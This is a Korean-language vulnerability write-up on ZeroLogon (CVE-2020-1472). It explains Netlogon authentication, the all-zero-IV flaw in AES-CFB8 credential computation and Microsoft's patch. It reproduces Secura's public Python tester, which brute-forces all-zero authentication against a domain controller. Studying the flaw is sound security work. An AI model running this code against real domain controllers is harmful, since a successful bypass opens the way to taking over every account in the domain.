


﻿ZeroLogon 취약점 
==========
Information
-----
* CVE-2020-1472
* 해당 소프트웨어 : Active Directory (Windows Server Directory Service)
* 해당 버젼 : Over Windows Server 2008 R2
*  취약점 유형 : 계정 탈취 취약점

Description
---

해당 취약점은 공격자가 Domain Controller에 대한 TCP 연결을 수립할 수 있다면 Active Directory 상의 모든 계정의 password를 초기화 할 수 있는 취약점이다. 

Root Cause
---
### Active Directory
Active Directory란  Windows Server에서 제공하는 Directory Service
*  Directory Service는 중앙 서버에 공통된 데이터베이스를 생성하여 각 서버와 클라이언트는 해당 데이터베이스를 공유하여 Object를 검색하고 중앙에서 사용자 인증 및 권한 부여 처리가 가능하도록 처리해주는 서비스 

* Domain Controller는 Active Directory를 운영하는 서버 컴퓨터 

* 중앙에 DB를 두고 계정들에 대한 인증을 수행한 후에 요청하는 서비스들을 정상적으로 이용할 수 있다. 
![이미지](/val0ur/CVE/blob/main/CVE-2020-1472/AD%201.PNG)



### Netlogon Protocol
Domain Controller에서 Domain Client를 인증할 때 Netlogon Protocol을 사용한다. 
![이미지](https://github.com/val0ur/CVE/blob/main/CVE-2020-1472/netlogon%20%EC%9D%B8%EC%A6%9D%20%EA%B3%BC%EC%A0%95.PNG)

1. Client와 Server는 Random 8-Byte nonce 값을 교환한다. (Client Challenge, Server Challenge)

2.  KDF를 사용하여 Session Key를 생성한다. 
    > Session Key = KDF(Client PW Hash + Client Challenge + Server Challenge)
  3. Client는 Session Key를 이용해 Client Credential 생성 후 서버로 전송
  4. Server에서 Client가 보낸 Client Credential과 Server에서 계산한 Client Credential이 같으면 정상 Client로 간주하고 Server Credential을 전송 
  5. Client는 만들어진 Session Key를 가지고 이 Credential을 sign + seal 하여 권한이 필요한 작업을 수행한다. 
	  > 4의 인증 수립 후 Message들에 대해 sign + seal을 할지는 Flag 값을 통해 변경 가능 



### Vulnerability
위의 인증과정에서 Client와 Server는 Credential Value를 만들기 위해 NlComputeCredentials 함수를 사용하는데 
암호화 과정에서 IV 값이 0으로 고정되어 있어 발생하는 취약점 

공격자는 해당 취약점을 이용해서 Client Credential을 0으로 만들 수 있고 정상적인 Client로 인증 후 계정의 password를 초기화 시킬 수 있다. 

#### Details 
- NlComputeCredentials 함수는 8-Byte Input(Server 입장에서는 Client Challenge)를 받아 암호화 하여 8-Byte의 Credential을 만든다. 

- 해당 함수는 2DES or AES 암호화를 지원하는데 최근 대부분의 Domain Server는 AES 방식만을 사용한다. 
- 암호화 과정의 NlInitializeCNG 함수를 통해 AES-CFB8을 사용한다는 것을 알 수 있다. 
 ![이미지](https://github.com/val0ur/CVE/blob/main/CVE-2020-1472/NlInitializeCNG%20func.PNG)

##### AES-CFB8
![이미지](https://github.com/val0ur/CVE/blob/main/CVE-2020-1472/AES-CFB8%20encryption.PNG)

- AES-CFB8은 16 바이트의 IV값을 가진다.
- IV에 Session Key를 인자로  AES를 수행하고 나온 결과값의 첫 바이트와 Plain Text의 첫 바이트를 XOR 하여 Cipher Text를 만든다. 
- IV 값이 랜덤 값일 경우에는 평문을 안전하게 암호화 할 수 있지만 NlComputeCredentials 함수에서는 IV 값을 0으로 사용한다. 

		그렇다면 IV 값이 0일 때 생기는 문제는 무엇인가? 

##### AES-CFB8 (when IV = 0)
![이미지](https://github.com/val0ur/CVE/blob/main/CVE-2020-1472/AES-CFB8%20all-zero.PNG)

- IV 값을 Session Key로 AES를 수행한 후 나온 결과값의 첫 바이트가 0이라면 Plain Text도 0이고 Cipher Text도 0인 경우가 생긴다. 

- 공격자 입장에서는 Session Key를 몰라도 암호화한 결과값의 첫 바이트가 0이 되는 경우만 찾으면 Cipher Text도 0이 되므로 해당 취약점을 이용할 수 있다. 

인증은 NetServerAuthenticate3 함수에서 수행하며 NlComputeCredentials를 통해 Server가 계산한 ClientCredential(MADE)과 Client가 보낸  ClientCredential(GOT)가 동일하다면 인증해준다. 

![이미지](https://github.com/val0ur/CVE/blob/main/CVE-2020-1472/NetServerAuthenticate3%20func.PNG)

// Zerologon을 활용한 Exploit 부분 아직 안 넣음

Patch
---
20년 8월 MS사는 CVE-2020-1472 패치를 출시했고 21년 2월 9일에 추가 패치를 출시할 예정이다. 

- 현재 패치는 Netlogon Protocol을 변경하고,

- 비규격 장치 검색용으로 이벤트를 기록하고, 
- 명시적 예외를 포함하는 모든 도메인 참가 장치에 대한 보호를 사용하도록 설정하는 기능이 추가됐다. 
 

POC
---
공개된 PoC는 아래와 같다. 
```Python

#!/usr/bin/env python3

from impacket.dcerpc.v5 import nrpc, epm
from impacket.dcerpc.v5.dtypes import NULL
from impacket.dcerpc.v5 import transport
from impacket import crypto

import hmac, hashlib, struct, sys, socket, time
from binascii import hexlify, unhexlify
from subprocess import check_call

# Give up brute-forcing after this many attempts. If vulnerable, 256 attempts are expected to be neccessary on average.
MAX_ATTEMPTS = 2000 # False negative chance: 0.04%

def fail(msg):
  print(msg, file=sys.stderr)
  print('This might have been caused by invalid arguments or network issues.', file=sys.stderr)
  sys.exit(2)

def try_zero_authenticate(dc_handle, dc_ip, target_computer):
  # Connect to the DC's Netlogon service.
  binding = epm.hept_map(dc_ip, nrpc.MSRPC_UUID_NRPC, protocol='ncacn_ip_tcp')
  rpc_con = transport.DCERPCTransportFactory(binding).get_dce_rpc()
  rpc_con.connect()
  rpc_con.bind(nrpc.MSRPC_UUID_NRPC)

  # Use an all-zero challenge and credential.
  plaintext = b'\x00' * 8
  ciphertext = b'\x00' * 8

  # Standard flags observed from a Windows 10 client (including AES), with only the sign/seal flag disabled. 
  flags = 0x212fffff

  # Send challenge and authentication request.
  nrpc.hNetrServerReqChallenge(rpc_con, dc_handle + '\x00', target_computer + '\x00', plaintext)
  try:
    server_auth = nrpc.hNetrServerAuthenticate3(
      rpc_con, dc_handle + '\x00', target_computer + '$\x00', nrpc.NETLOGON_SECURE_CHANNEL_TYPE.ServerSecureChannel,
      target_computer + '\x00', ciphertext, flags
    )

    
    # It worked!
    assert server_auth['ErrorCode'] == 0
    return rpc_con

  except nrpc.DCERPCSessionError as ex:
    # Failure should be due to a STATUS_ACCESS_DENIED error. Otherwise, the attack is probably not working.
    if ex.get_error_code() == 0xc0000022:
      return None
    else:
      fail(f'Unexpected error code from DC: {ex.get_error_code()}.')
  except BaseException as ex:
    fail(f'Unexpected error: {ex}.')


def perform_attack(dc_handle, dc_ip, target_computer):
  # Keep authenticating until succesfull. Expected average number of attempts needed: 256.
  print('Performing authentication attempts...')
  rpc_con = None
  for attempt in range(0, MAX_ATTEMPTS):  
    rpc_con = try_zero_authenticate(dc_handle, dc_ip, target_computer)
    
    if rpc_con == None:
      print('=', end='', flush=True)
    else:
      break

  if rpc_con:
    print('\nSuccess! DC can be fully compromised by a Zerologon attack.')
  else:
    print('\nAttack failed. Target is probably patched.')
    sys.exit(1)


if __name__ == '__main__':
  if not (3 <= len(sys.argv) <= 4):
    print('Usage: zerologon_tester.py <dc-name> <dc-ip>\n')
    print('Tests whether a domain controller is vulnerable to the Zerologon attack. Does not attempt to make any changes.')
    print('Note: dc-name should be the (NetBIOS) computer name of the domain controller.')
    sys.exit(1)
  else:
    [_, dc_name, dc_ip] = sys.argv

    dc_name = dc_name.rstrip('$')
    perform_attack('\\\\' + dc_name, dc_ip, dc_name)
``` 

References
---
[1] [Secura - Zerologon(CVE-2020-1472)](https://www.secura.com/blog/zero-logon)

[2] [PoC - SecuraBV](https://github.com/SecuraBV/CVE-2020-1472)

[3] [A different way of abusing Zerologon](https://dirkjanm.io/a-different-way-of-abusing-zerologon/)




